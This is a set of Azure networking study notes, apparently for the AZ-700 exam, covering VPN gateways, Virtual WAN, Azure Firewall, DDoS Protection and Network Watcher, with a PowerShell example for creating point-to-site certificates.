<h2 id="configure-expressroute-and-site-to-site-coexisting-connections"><a class="header" href="#configure-expressroute-and-site-to-site-coexisting-connections">Configure ExpressRoute and site to site coexisting connections</a></h2>
<ul>
<li>
<p>You can configure Site-to-Site VPN as a secure failover path for ExpressRoute or use Site-to-Site VPNs to connect to sites that are not connected through ExpressRoute.</p>
</li>
<li>
<p>Configuring Site-to-Site VPN and ExpressRoute coexisting connections has several advantages:
-You can configure a Site-to-Site VPN as a secure failover path for ExpressRoute.</p>
<ul>
<li>Alternatively, you can use Site-to-Site VPNs to connect to sites that are not connected through ExpressRoute.</li>
</ul>
</li>
<li>
<p>You can configure either gateway first. Typically, you will incur no downtime when adding a new gateway or gateway connection.</p>
</li>
<li>
<p>Network Limits and limitations</p>
<ul>
<li>Only route-based VPN gateway is supported. You must use a route-based VPN gateway. You also can use a route-based VPN gateway with a VPN connection configured for ‚Äòpolicy-based traffic selectors‚Äô.</li>
<li>The ASN of Azure VPN Gateway must be set to 65515. Azure VPN Gateway supports the BGP routing protocol. For ExpressRoute and Azure VPN to work together, you must keep the Autonomous System Number of your Azure VPN gateway at its default value, 65515. If you previously selected an ASN other than 65515 and you change the setting to 65515, you must reset the VPN gateway for the setting to take effect.</li>
<li>The gateway subnet must be /27 or a shorter prefix, (such as /26, /25), or you will receive an error message when you add the ExpressRoute virtual network gateway.</li>
<li>Coexistence in a dual stack VNet is not supported. If you are using ExpressRoute IPv6 support and a dual-stack ExpressRoute gateway, coexistence with VPN Gateway will not be possible.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="vpn"><a class="header" href="#vpn">VPN</a></h1>
<h2 id="what-is-a-vpn"><a class="header" href="#what-is-a-vpn">What is a VPN?</a></h2>
<ul>
<li>A VPN (Virtual Private Network) is a service that allows you to connect to the internet via an encrypted tunnel to ensure your online privacy and protect your sensitive data.</li>
</ul>
<h2 id="azure-point-to-site-vpn"><a class="header" href="#azure-point-to-site-vpn">Azure Point to Site VPN</a></h2>
<ul>
<li>Azure Point-to-Site VPN is a secure connection between a virtual network in Azure and a client computer. VPN is used to connect the client to the Azure virtual network.</li>
<li>The VPN connection is encrypted and provides secure access to on-premises resources.</li>
<li>The VPN client is installed on the client computer and is used to connect to the Azure virtual network.</li>
<li>The VPN client is used to connect to the Azure virtual network.</li>
<li>The Virtual Network Gateway is used to connect the on-premises network to the Azure virtual network.</li>
<li>P2S VPN Connections require that you configure 3 configuration settings in Azure (in addition to a VNG, etc.):
<ul>
<li>Address Pool: The IP address range that will be assigned to the VPN clients.
<ul>
<li>The address range that you choose must not overlap with the vNet‚Äôs address range.</li>
<li>If multiple protocols are configured for the tunnel type, and SSTP is one of those protocols, the address pool will be split between the configured protocols.</li>
</ul>
</li>
<li>Tunnel Type: The tunnel type that will be used for the VPN connection. Options are SSTP, IKEv2, and OpenVPN.
<ul>
<li>OpenVPN is SSL-based and operates on port 443.
<ul>
<li>OpenVPN is supported on all platforms, but a client will usually need to be downloaded and installed.</li>
<li>OpenVPN is required if you want clients to authenticate with Azure Active Directory credentials.</li>
</ul>
</li>
<li>SSTP is SSL-based and operates on port 443. It is a Microsoft-proprietary protocol.</li>
<li>IKEv2 is IPsec-based and operates on UDP ports 4500 and 500 and IP protocol number 50.
<ul>
<li>Android, Linux, iOS, MacOS, and Windows 10 (and above) come pre-installed with clients that support IKEv2.</li>
<li>Windows client will try IKEv2 first when negotiating a connection. They fall back to SSTP.</li>
</ul>
</li>
</ul>
</li>
<li>Authentication Type: The authentication type that will be used for the VPN connection. Options are Azure Certificate, Azure AD, and Radius.
<ul>
<li>Azure Certificate: The client must have a client certificate installed to connect to the Azure Virtual Network Gateway.
<ul>
<li>The client certificate must be installed in the ‚ÄòLocal Machine‚Äô certificate store on the client computer.</li>
<li>The Virtual Network Gateway must have the public key of the client certificate uploaded to the Azure Virtual Network Gateway. Or the public key of the root certificate that signed the client certificate.</li>
</ul>
</li>
<li>Azure AD: The client must have an Azure Active Directory account to connect to the Azure Virtual Network Gateway.
<ul>
<li>Allows users to connect to the VPN using their Azure AD credentials.</li>
<li>Native Azure AD authentication is only supported for OpenVPN connections that use the Azure VPN Client for Windows 10 or later and MacOS clients.</li>
<li>The main advantage here is we can benefit from additional identity and security capabilities provided by Azure AD, such as MFA.</li>
</ul>
</li>
<li>Radius: The client must have a Radius account to connect to the Azure Virtual Network Gateway. Clients authentication against a RADIUS server hosted in Azure or on-premises.
<ul>
<li>The Virtual Network Gateway forwards authentication requests to/from the client and RADIUS server. Connectivity is important!</li>
<li>The RADIUS server can be implemented to integrate with Azure Entra ID or any other external identity system. No need to upload root certificates and revoke client certificates in Azure.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>P2S connections require a route-based VPN Type.</li>
</ul>
<h2 id="azure-site-to-site-vpn"><a class="header" href="#azure-site-to-site-vpn">Azure Site to Site VPN</a></h2>
<ul>
<li>Azure Site-to-Site VPN is a secure connection between an on-premises network and an Azure virtual network.</li>
<li>The VPN connection is encrypted and provides secure access to on-premises resources.</li>
<li>The VPN connection is established between the on-premises network and the Azure virtual network.</li>
<li>The Virtual Network Gateway is used to connect the on-premises network to the Azure virtual network.</li>
</ul>
<h2 id="virtual-network-gateway"><a class="header" href="#virtual-network-gateway">Virtual Network Gateway</a></h2>
<ul>
<li>
<p>A Virtual Network Gateway is used to send encrypted traffic between an Azure virtual network and an on-premises location over the public internet.</p>
</li>
<li>
<p>Virtual Network Gateway supports the following hybrid connection options:</p>
<ul>
<li><strong>Site to Site VPN connection over IPSec (IKE v1 and IKE v2)</strong> - This option can be used to connect an on-premises network to an Azure virtual network.</li>
<li><strong>Point to Site VPN connection over SSTP (Secure Socket Tunneling Protocol)</strong> - This option can be used to connect a client computer to an Azure virtual network.</li>
<li><strong>VNet to VNet VPN connection over IPSec (IKE v1 and IKE v2)</strong> - This option can be used to connect two Azure virtual networks.</li>
</ul>
</li>
<li>
<p>When implementing the VPN Gateway to connect two vNets, there are two connection types you can choose from:</p>
<ul>
<li>vNet-to-vNet: If the source and targets vNets are in the same Azure subscription, choose this option.</li>
<li>Site-to-Site (IPsec): If the source and target vNets are not in the same Azure subscription, choose this option.</li>
</ul>
</li>
</ul>
<h3 id="virtual-network-gateway-skus"><a class="header" href="#virtual-network-gateway-skus">Virtual Network Gateway SKUs</a></h3>
<p><img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/vpn-gateway-skus.png" alt="Virtual Network Gateway SKUs"></p>
<h3 id="virtual-network-gateway-pricing"><a class="header" href="#virtual-network-gateway-pricing">Virtual Network Gateway Pricing</a></h3>
<pre><code>| SKU | Price |
| --- | --- |
| Basic | $0.04/hour |
| VpnGw1 | $0.19/hour |
| VpnGw2 | $0.49/hour |
| VpnGw3 | $1.25/hour |
| VpnGw4 | $2.10/hour |
| VpnGw5 | $3.65/hour |
</code></pre>
<h3 id="virtual-network-gateway-certificate-authentication"><a class="header" href="#virtual-network-gateway-certificate-authentication">Virtual Network Gateway Certificate Authentication</a></h3>
<ul>
<li>Azure Virtual Network Gateway supports certificate authentication for Point-to-Site VPN connections.</li>
<li>The VPN client must have a client certificate installed to connect to the Azure Virtual Network Gateway.</li>
<li>The client certificate must be installed in the ‚ÄòLocal Machine‚Äô certificate store on the client computer.</li>
</ul>
<pre><code># Create a self-signed root certificate
$params = @{
    Type = 'Custom'
    Subject = 'CN=P2SRootCert'
    KeySpec = 'Signature'
    KeyExportPolicy = 'Exportable'
    KeyUsage = 'CertSign'
    KeyUsageProperty = 'Sign'
    KeyLength = 2048
    HashAlgorithm = 'sha256'
    NotAfter = (Get-Date).AddMonths(24)
    CertStoreLocation = 'Cert:\CurrentUser\My'
}
$cert = New-SelfSignedCertificate @params

# Create a self-signed client certificate
$params = @{
       Type = 'Custom'
       Subject = 'CN=P2SChildCert'
       DnsName = 'P2SChildCert'
       KeySpec = 'Signature'
       KeyExportPolicy = 'Exportable'
       KeyLength = 2048
       HashAlgorithm = 'sha256'
       NotAfter = (Get-Date).AddMonths(18)
       CertStoreLocation = 'Cert:\CurrentUser\My'
       Signer = $cert
       TextExtension = @(
        '2.5.29.37={text}1.3.6.1.5.5.7.3.2')
   }
   New-SelfSignedCertificate @params
</code></pre>
<h3 id="azure-active-directory-authentication"><a class="header" href="#azure-active-directory-authentication">Azure Active Directory Authentication</a></h3>
<ul>
<li>Azure Virtual Network Gateway supports Azure Active Directory authentication for Point-to-Site VPN connections.</li>
<li>The VPN client must have an Azure Active Directory account to connect to the Azure Virtual Network Gateway.</li>
<li>You must register an Azure AD application and grant permissions to the application to use the Azure Virtual Network Gateway.</li>
<li>You must set the authentication type to ‚ÄòAzure Active Directory‚Äô in the Azure Virtual Network Gateway configuration.
<ul>
<li>You must provide the Tenant ID, Audience (client Id of app), and Issuer of the Azure AD application in the Azure Virtual Network Gateway configuration.</li>
</ul>
</li>
<li>Download and install the Azure VPN Client from the MS Store</li>
<li>Sign in with your Azure AD account to connect to the Azure Virtual Network Gateway.</li>
</ul>
<h3 id="radius-authentication"><a class="header" href="#radius-authentication">Radius Authentication</a></h3>
<ul>
<li>Azure Virtual Network Gateway supports Radius authentication for Point-to-Site VPN connections.</li>
<li>The VPN client must have a Radius account to connect to the Azure Virtual Network Gateway.</li>
<li>You must configure the Radius server settings in the Azure Virtual Network Gateway configuration.</li>
<li>You must provide the Radius server IP (primary and secondary) and Radius server secret (primary and secondary)</li>
</ul>
<h2 id="local-network-gateway"><a class="header" href="#local-network-gateway">Local Network Gateway</a></h2>
<ul>
<li>A Local Network Gateway is a representation of the on-premises location. It contains the public IP address of the on-premises location and the address space.</li>
</ul>
<h2 id="gateway-subnet"><a class="header" href="#gateway-subnet">Gateway Subnet</a></h2>
<ul>
<li>The gateway subnet is used to deploy the virtual network gateway. The gateway subnet must be named ‚ÄòGatewaySubnet‚Äô to work properly.</li>
<li>The size of the gateway subnet must be at least /29 or larger.</li>
<li>Nothing must be deployed in the gateway subnet. It is used by the gateway services only.</li>
</ul>
<h3 id="route-based-vs-policy-based-vpn"><a class="header" href="#route-based-vs-policy-based-vpn">Route based vs. Policy based VPN</a></h3>
<ul>
<li>
<p><strong>Policy-based VPN</strong> - This type of VPN uses a policy defined on the VPN to determine where to send traffic. The policy defines an access list of traffic that should be sent through the VPN tunnel.</p>
<ul>
<li>Limitations:
<ul>
<li>There is no support for dynamic routing protocols such as BGP.</li>
<li>It can only be used to establish site-to-site VPN connections.</li>
<li>It only supports 1 tunnel when implemented with the basic gateway.</li>
<li>If you have a legacy on-prem VPN device that does not support route-based VPNs, you will likely need to create a policy-based VPN.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Route-based VPN</strong> - This type of VPN uses a routing table to determine where to send traffic. The routing table is used to determine the next hop for the traffic.</p>
<ul>
<li>Only route-based gateway SKUs support active/active mode.</li>
<li>Point-to-site connections require a route-based VPN gateway.</li>
</ul>
<p><img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/route-vs-policy-based-vpn.png" alt="Route-based VPN"></p>
</li>
</ul>
<h2 id="troubleshoot-vpns"><a class="header" href="#troubleshoot-vpns">Troubleshoot VPNs</a></h2>
<ul>
<li>There are several diagnostic logs you can reference when troubleshooting VPN Connections and Virtual Network Gateways
<ul>
<li><strong>Gateway Diagnostic Log</strong>: This log contains diagnostic logs for the gateway, including configuration changes and maintenance events.</li>
<li><strong>Tunnel Diagnostic Log</strong>: This log contains tunnel state change events. This log is useful to view the historical connectivity status of the tunnel.</li>
<li><strong>Route Diagnostic Log</strong>: This log contains routing logs, including changes to static routes and BGP events</li>
<li><strong>IKE Diagnostic Log</strong>: This log contains IKE control messages and events on the gateway.</li>
<li><strong>P2S Diagnostic Log</strong>: This log contains point-to-site control messages and events on the gateway.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-virtual-wan"><a class="header" href="#azure-virtual-wan">Azure Virtual WAN</a></h1>
<p><img src="clouds/azure/az700/images/vwan.png" alt=""></p>
<h2 id="overview-6"><a class="header" href="#overview-6">Overview</a></h2>
<ul>
<li><strong>Azure Virtual WAN (vWAN)</strong>: A networking service that provides optimized and automated branch connectivity to, and through, Azure.</li>
<li><strong>Virtual Hub</strong>: A Microsoft-managed virtual network that enables connectivity between your on-premises networks, Azure VNets, and remote users.</li>
</ul>
<h2 id="key-features-3"><a class="header" href="#key-features-3">Key Features</a></h2>
<ol>
<li><strong>Centralized Management</strong>: Simplifies the management of large-scale network architectures by providing a single pane of glass for managing connectivity.</li>
<li><strong>Scalability</strong>: Designed to handle thousands of VNets, branch connections, and users.</li>
<li><strong>High Availability</strong>: Built-in redundancy and high availability for critical network connections.</li>
<li><strong>Security</strong>: Integrated with Azure Firewall, DDoS protection, and other security services for comprehensive protection.</li>
<li><strong>Connectivity</strong>: Supports Site-to-Site VPN, Point-to-Site VPN, ExpressRoute, and Azure Private Link.</li>
</ol>
<h2 id="components-3"><a class="header" href="#components-3">Components</a></h2>
<ul>
<li><strong>Virtual WAN</strong>: A management service that we can use to deploy, manage, and monitor resources for connecting networks together. This is a global resource and does not live in a particular network.</li>
<li><strong>vWAN Hubs</strong>: Regional virtual network hubs that provide central connectivity and routing. A virtual hub is a Microsoft-managed virtual network. The hub contains various service endpoints to enable connectivity. From your on-premises network (vpnsite), you can connect to a VPN gateway inside the virtual hub, connect ExpressRoute circuits to a virtual hub, or even connect mobile users to a point-to-site gateway in the virtual hub. The hub is the core of your network in a region. Multiple virtual hubs can be created in the same region. A hub gateway isn‚Äôt the same as a virtual network gateway that you use for ExpressRoute and VPN Gateway. For example, when using Virtual WAN, you don‚Äôt create a site-to-site connection from your on-premises site directly to your VNet. Instead, you create a site-to-site connection to the hub. The traffic always goes through the hub gateway. This means that your VNets don‚Äôt need their own virtual network gateway. Virtual WAN lets your VNets take advantage of scaling easily through the virtual hub and the virtual hub gateway.</li>
<li><strong>vWAN HUB Connections</strong>: Connections between a hub and a VNet in the same region. A vNet can only be connected to one hub.</li>
<li><strong>Hub-to-Hub Connections</strong>: Connectivity between hubs in different regions for global reach. Hubs are all connected to each other in a virtual WAN. This implies that a branch, user, or VNet connected to a local hub can communicate with another branch or VNet using the full mesh architecture of the connected hubs. You can also connect VNets within a hub transiting through the virtual hub, as well as VNets across hub, using the hub-to-hub connected framework.</li>
<li><strong>Branch-to-Hub Connections</strong>: Site-to-site VPN connections from on-premises locations to the hub.</li>
<li><strong>User VPN Connections</strong>: Point-to-site VPN connections from remote users to the hub.</li>
</ul>
<h2 id="use-cases-7"><a class="header" href="#use-cases-7">Use Cases</a></h2>
<ol>
<li><strong>Branch Connectivity</strong>: Simplifies the connection of branch offices to Azure and to each other.</li>
<li><strong>Global Network Architecture</strong>: Centralizes and optimizes connectivity between VNets and on-premises networks across multiple regions.</li>
<li><strong>Remote Access</strong>: Provides secure access for remote users through point-to-site VPN.</li>
</ol>
<h2 id="benefits-2"><a class="header" href="#benefits-2">Benefits</a></h2>
<ul>
<li><strong>Simplified Configuration</strong>: Reduces the complexity of managing multiple VNets and connections.</li>
<li><strong>Optimized Performance</strong>: Leverages Microsoft‚Äôs global backbone for high performance and low latency.</li>
<li><strong>Cost-Effective</strong>: Reduces the need for expensive hardware and dedicated network connections.</li>
</ul>
<h2 id="types-of-vwan"><a class="header" href="#types-of-vwan">Types of vWAN</a></h2>
<ul>
<li>Basic
<ul>
<li>Only supports site-to-site VPN connections in a single hub (no hub-to-hub, ExpressRoute, or user VPN connections).</li>
<li>There is a cost advantage in that we do not have to pay the base hourly fee and data processing free for the vWAN hubs that we implement.</li>
</ul>
</li>
<li>Standard
<ul>
<li>Supports all connectivity types across multiple hubs.</li>
<li>There is an hourly base fee for every hub that we create (.25/hour).</li>
</ul>
</li>
<li>You can change the SKU after the vWAN has been created. You can upgrade a basic to a standard, but you cannot downgrade a standard to a basic.</li>
</ul>
<h2 id="routing-infrastructure-units-rius"><a class="header" href="#routing-infrastructure-units-rius">Routing Infrastructure Units (RIUs)</a></h2>
<ul>
<li>When a new vWAN is created, virtual hub routers are deployed into it. The virtual hub router is the central component that manages all routing between vNETs and gateways.</li>
<li>A Routing Infrastructure Unit (RIU) is a unit of scale that defines both the aggregate throughput of the virtual hub router and the aggregate number of virtual machines that can be deployed in all connected VNets.</li>
<li>By default, the virtual hub router will deploy 2 RIUs with no extra cost. The 2 units support 3 Gbps of throughput and 2000 connections across all connected vNETs.</li>
<li>You can add additional RIUs in increments of 1 Gbps of throughput and 1000 VM connections.</li>
<li>There is an additional cost of .10/RIU above the 2 that are included.</li>
</ul>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Routing infrastructure unit</th><th>Aggregate throughput (Gbps)</th><th>Number of VMs</th></tr>
</thead>
<tbody>
<tr><td>2</td><td>3</td><td>2000</td></tr>
<tr><td>3</td><td>3</td><td>3000</td></tr>
<tr><td>4</td><td>4</td><td>4000</td></tr>
<tr><td>5</td><td>5</td><td>5000</td></tr>
<tr><td>6</td><td>6</td><td>6000</td></tr>
<tr><td>7</td><td>7</td><td>7000</td></tr>
<tr><td>8</td><td>8</td><td>8000</td></tr>
<tr><td>9</td><td>9</td><td>9000</td></tr>
<tr><td>10</td><td>10</td><td>10000</td></tr>
</tbody>
</table>
</div>
<h2 id="site-to-site-connectivity-with-vwan"><a class="header" href="#site-to-site-connectivity-with-vwan">Site to Site Connectivity with vWAN</a></h2>
<ul>
<li>You can connect remote networks to the vWAN hub using site-to-site VPN connections or ExpressRoute.</li>
<li>To deploy a site to site VPN connection, we need to deploy a Site-to-Site VPN Gateway into our vWAN hub by specifying the number of gateway scale units we want. The number that we specify for the Gateway Scale Units defines the aggregate maximum throughput for the VPN connections.</li>
<li>S2S VPN Gateway instances in a vWAN hub are always deployed in an active-active configuration for high availability.</li>
<li>a VPN Gateway in a vWAN hub is limited to 30 connections while 20 Gateway Scale Units in a vWAN hub can support up to 1000 connections.</li>
</ul>
<h2 id="routing-order-precedence"><a class="header" href="#routing-order-precedence">Routing Order Precedence</a></h2>
<ul>
<li>If multiple paths exist for a destination subnet, the virtual hub router uses the following logic to determine the route to the destination:
<ol>
<li>Routes with the longest prefix match are always preferred</li>
<li>Static routes are preferred over routes learned via BGP</li>
<li>The best path is selected based on the route preference configured (ExpressRoute-learned route, VPN-learned route, or the route with the shortest BGP AS-Path Length)</li>
</ol>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="secure-and-monitor-networks"><a class="header" href="#secure-and-monitor-networks">Secure-and-monitor-networks</a></h1>
<h2 id="directory-map-9"><a class="header" href="#directory-map-9">Directory Map</a></h2>
<ul>
<li><a href="#application-security-groups">asg</a></li>
<li><a href="#azure-firewall">azure-firewall</a></li>
<li><a href="#ddos-protection">ddos-protection</a></li>
<li><a href="#network-watcher">network-watcher</a></li>
<li><a href="#network-security-groups">nsg</a></li>
<li><a href="#web-application-firewall">waf</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="application-security-groups"><a class="header" href="#application-security-groups">Application Security Groups</a></h1>
<h2 id="introduction-24"><a class="header" href="#introduction-24">Introduction</a></h2>
<ul>
<li>Application Security Groups (ASGs) are used to group virtual machines and apply network security group rules to the group</li>
</ul>
<h2 id="benefits-3"><a class="header" href="#benefits-3">Benefits</a></h2>
<ul>
<li>Simplifies network security group management</li>
<li>Reduces the number of rules that need to be created</li>
<li>Allows for more granular control over network security group rules</li>
</ul>
<h2 id="example-3"><a class="header" href="#example-3">Example</a></h2>
<ul>
<li>Create an ASG</li>
<li>Add VMs to the ASG</li>
<li>Add the ASG as a traffic source in a network security group rule</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-firewall"><a class="header" href="#azure-firewall">Azure Firewall</a></h1>
<p><a href="clouds/azure/az700/images/az-firewall.png"></a></p>
<h2 id="introduction-25"><a class="header" href="#introduction-25">Introduction</a></h2>
<ul>
<li>Azure Firewall is a managed, cloud-based network security service that protects your Azure Virtual Network resources. It‚Äôs a fully stateful firewall as a service with built-in high availability and unrestricted cloud scalability. It can be used to scan inbound and outbound traffic.</li>
<li>Azure Firewall requires it‚Äôs own subnet. The name needs to be <code>AzureFirewallSubnet</code>.</li>
<li>Force Tunneling requires that a subnet named <code>AzureFirewallManagementSubnet</code> be created. This subnet is used for Azure Firewall management traffic.</li>
</ul>
<h2 id="azure-firewall-features"><a class="header" href="#azure-firewall-features">Azure Firewall Features</a></h2>
<ul>
<li>Built-in high availability</li>
<li>Unrestricted cloud scalability</li>
<li>Application FQDN Filtering rules</li>
<li>FQDN Tags - tags make it easy for you to allow well-known Azure Service network traffic through your firewall.</li>
<li>Service Tags - A service tag represents a group of IP address prefixes to help minimize security rule complexity. Microsoft manages these. You cannot create your own service tags or modify existing service tags.</li>
<li>Threat Intelligence - IDS/IPS</li>
<li>TLS Inspection - decrypt outbound traffic, process the data, and then re-encrypt it before sending it to it‚Äôs destination</li>
<li>Outbound SNAT support</li>
<li>Inbound DNAT support</li>
<li>Forced Tunneling</li>
</ul>
<h2 id="rule-processing"><a class="header" href="#rule-processing">Rule Processing</a></h2>
<h3 id="classic-rules"><a class="header" href="#classic-rules">Classic Rules</a></h3>
<ul>
<li>You can create NAT rules, network rules, and application rules, and this can all be done using classic rules or Firewall Policy</li>
<li>Azure Firewall denies all traffic by default. You must create rules to allow traffic.</li>
<li>With classic rules, rule collections are processed according to the rule type in priority order. Lower to higher numbers from 100 (highest priority) to 65000 (lowest priority).</li>
</ul>
<h3 id="firewall-policy"><a class="header" href="#firewall-policy">Firewall Policy</a></h3>
<ul>
<li>Configuring a single Azure Firewall can be complex due to multiple rule collections, including:
<ul>
<li>Network Address Translation (NAT) rules</li>
<li>Network rules</li>
<li>Application rules</li>
</ul>
</li>
<li>Additional complexities include custom DNS settings, threat intelligence rules, and the need for different rules for different groups (e.g., developers, database users, marketing).</li>
<li><strong>Firewall Policy</strong>:
<ul>
<li>An Azure resource that contains collections of NAT, network, and application rules.</li>
<li>Also includes custom DNS settings, threat intelligence settings, and more.</li>
<li>Can be applied to multiple firewalls via Azure Firewall Manager.</li>
<li>Supports hierarchical policies, where a base policy can be inherited by specialized policies.</li>
</ul>
</li>
<li>With Firewall Policy, rules are organized in rule collections which are contained in rule collection groups. Rule collections can be of the following types:
<ul>
<li>DNAT</li>
<li>Network</li>
<li>Application</li>
</ul>
</li>
<li>You can define multiple rule collection types in a rule collection group. But all of the rules in a rule collection must be of the same type.</li>
<li>Rule collections are processed in the following order:
<ul>
<li>DNAT</li>
<li>Network</li>
<li>Application</li>
</ul>
</li>
</ul>
<h2 id="availability-zones"><a class="header" href="#availability-zones">Availability Zones</a></h2>
<ul>
<li>Azure Firewall supports Availability Zones. When you create an Azure Firewall, you can choose to deploy it in a single zone or across all zones.</li>
<li>SLAs:
<ul>
<li>Single Zone: 99.95%</li>
<li>Multiple Zones: 99.99%</li>
</ul>
</li>
</ul>
<h2 id="azure-firewall-service-tiers"><a class="header" href="#azure-firewall-service-tiers">Azure Firewall Service Tiers</a></h2>
<ul>
<li>Azure Firewall is available in three service tiers: Basic, Standard, and Premium.
<ul>
<li><strong>Basic</strong>: Designed for small and medium-sized businesses.
<ul>
<li>Provides basic network traffic protection at an affordable cost.</li>
</ul>
</li>
<li><strong>Standard</strong>: Designed for organizations that require basic network security with high scalability at a moderate price.</li>
<li><strong>Premium</strong>: Designed for organizations in highly regulated industries that handle sensitive information and require a higher level of network security.
<ul>
<li>Able to encrypt/decrypt network traffic for TLS inspection</li>
<li>IDS/IPS capabilities</li>
<li>Supports path based URL filtering
<ul>
<li>Standard supports URL filtering, but you cannot filter based on the path of the URL.</li>
</ul>
</li>
<li>Web Categories
<ul>
<li>Allow or deny traffic to and from websites based on categories (gambling, social media, pornography, etc.)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="azure-firewall-capabilities"><a class="header" href="#azure-firewall-capabilities">Azure Firewall Capabilities</a></h2>
<ul>
<li>Network Filtering
<ul>
<li>Can filter traffic based on the five tuples of the source IP address, destination IP address, source port, destination port, and protocol.
<ul>
<li>You can filter based on user-defined groups of IP addresses of Azure Service Tags.</li>
</ul>
</li>
</ul>
</li>
<li>FQDN Filtering
<ul>
<li>A simple URL filter without TLS termination or packet inspection.</li>
<li>FQDN Filtering can be enabled at the network level or the application level. If configured at the application layer, it uses information in the HTTP headers to allow or block outgoing web traffic or Azure SQL traffic.</li>
<li>Can be bypassed by initiating requests using IP addresses.</li>
<li>To simplify applying rules to multiple FQDNs, you can use FQDN Tags. For example, if you wanted to filter Windows Update FQDNs, rather than manually maintaining a list of all the Windows Update FQDNs, you could simply use the Windows Update FQDN Tag.</li>
</ul>
</li>
<li>URL Filtering
<ul>
<li>Expands on FQDN filtering to evaluate the entire URL path, rather than just domain names.</li>
<li>This feature is only available with the Premium SKU.</li>
</ul>
</li>
<li>Web Categorization Filtering
<ul>
<li>Can be used to allow or block outgoing web traffic based on the category of the website. For example, you could block all social media websites.</li>
<li>Both Standard and Premium SKUs support this feature, with the Premium SKU supporting more accurate categorization.</li>
</ul>
</li>
<li>Threat Intelligence-based Filtering
<ul>
<li>Azure Firewall can use threat intelligence feeds to block known malicious IP addresses and domains.</li>
<li>Enabled in Alert Mode by default. But can be configured in Alert and Deny mode or even Disabled.</li>
<li>Supported by both Premium and Standard SKUs.</li>
</ul>
</li>
</ul>
<h2 id="azure-firewall-manager"><a class="header" href="#azure-firewall-manager">Azure Firewall Manager</a></h2>
<ul>
<li><strong>Azure Firewall Manager</strong> provides a central point for configuration and management of multiple Azure Firewall instances.</li>
<li>Enables the creation of one or more firewall policies that can be rapidly applied to multiple firewalls.</li>
</ul>
<h3 id="key-features-of-azure-firewall-manager"><a class="header" href="#key-features-of-azure-firewall-manager">Key Features of Azure Firewall Manager</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Feature</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Centralized management</td><td>Manage all firewall configurations across your network.</td></tr>
<tr><td>Manage multiple firewalls</td><td>Deploy, configure, and monitor multiple firewalls from a single interface.</td></tr>
<tr><td>Supports multiple network architectures</td><td>Protects standard Azure virtual networks and Azure Virtual WAN Hubs.</td></tr>
<tr><td>Automated traffic routing</td><td>Network traffic is automatically routed to the firewall (when used with Azure Virtual WAN Hub).</td></tr>
<tr><td>Hierarchical policies</td><td>Create parent and child firewall policies; child policies inherit rules/settings from parent.</td></tr>
<tr><td>Support for third-party security providers</td><td>Integrate third-party SECaaS solutions to protect your network‚Äôs internet connection.</td></tr>
<tr><td>DDoS protection plan</td><td>Associate virtual networks with a DDoS protection plan within Azure Firewall Manager.</td></tr>
<tr><td>Manage Web Application Firewall policies</td><td>Centrally create and associate Web Application Firewall (WAF) policies for platforms like Azure Front Door and Azure Application Gateway.</td></tr>
</tbody>
</table>
</div>
<blockquote>
<p><strong>Note</strong>: Azure Firewall Manager allows integration with third-party SECaaS solutions, enabling Azure Firewall to monitor local traffic while the third-party provider monitors internet traffic.</p>
</blockquote>
<h3 id="architecture-options"><a class="header" href="#architecture-options">Architecture Options</a></h3>
<ul>
<li><strong>Hub virtual network</strong>: A standard Azure virtual network where one or more firewall policies are applied.</li>
<li><strong>Secured virtual hub</strong>: An Azure Virtual WAN Hub where one or more firewall policies are applied.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ddos-protection"><a class="header" href="#ddos-protection">DDoS Protection</a></h1>
<h2 id="overview-7"><a class="header" href="#overview-7">Overview</a></h2>
<p>A distributed denial of service attack occurs when an attacker overwhelms a target with a flood of traffic, rendering the target unable to respond to legitimate requests. DDoS attacks can be difficult to mitigate because the attacker can use many different IP addresses to send traffic to the target. This makes it difficult to block the attacker‚Äôs traffic without also blocking legitimate traffic.</p>
<h2 id="types-of-ddos-attacks"><a class="header" href="#types-of-ddos-attacks">Types of DDoS Attacks</a></h2>
<ul>
<li><strong>Volumetric Attacks</strong>: These attacks flood the target with a large amount of traffic, overwhelming the target‚Äôs network capacity.</li>
<li><strong>Protocol Attacks</strong>: These attacks exploit vulnerabilities in network protocols to consume the target‚Äôs resources.</li>
<li><strong>Application Layer Attacks</strong>: These attacks target the application layer of the target, consuming resources such as CPU and memory.</li>
</ul>
<p>Azure DDoS Protection provides protection against volumetric and protocol attacks. To protect against application layer attacks, you can use a Web Application Firewall (WAF).</p>
<h2 id="azure-ddos-protection"><a class="header" href="#azure-ddos-protection">Azure DDoS Protection</a></h2>
<ul>
<li>Service Tiers
<ul>
<li><strong>IP Protection</strong>: This tier offers a pricing model in which you pay per protected public IP address.</li>
<li><strong>Network Protection</strong>: This tiers offers protection for an entire virtual network and all public IP addresses that are associated with resources in the vNet.
<ul>
<li>DDoS Network Protection provides additional features that are not available with the IP Protection:
<ul>
<li>DDoS Rapid Response Support - Gives you access to a team of DDoS response specialists who can help you mitigate an attack.</li>
<li>Cost Protection - Provides Azure credits back to us if a successful DDoS attack results in extra costs due to infrastructure scale out.</li>
<li>WAF Discount - Offers a pricing discount for Azure WAF</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="network-watcher"><a class="header" href="#network-watcher">Network Watcher</a></h1>
<h2 id="introduction-26"><a class="header" href="#introduction-26">Introduction</a></h2>
<p>Network Watcher is a collection of tools used to monitor and diagnose network connectivity in Azure. It focuses on monitoring the network health of IaaS services in Azure. Network Watcher is not suitable for monitoring PaaS services or performing web analytics. The tools in Network Watcher fall into two main categories - network monitoring and network diagnostics.</p>
<p>Network Monitor is a regional service which means we must create a Network Watcher in each region we want to monitor. Network Watcher is not enabled by default and must be enabled in each region we want to monitor.</p>
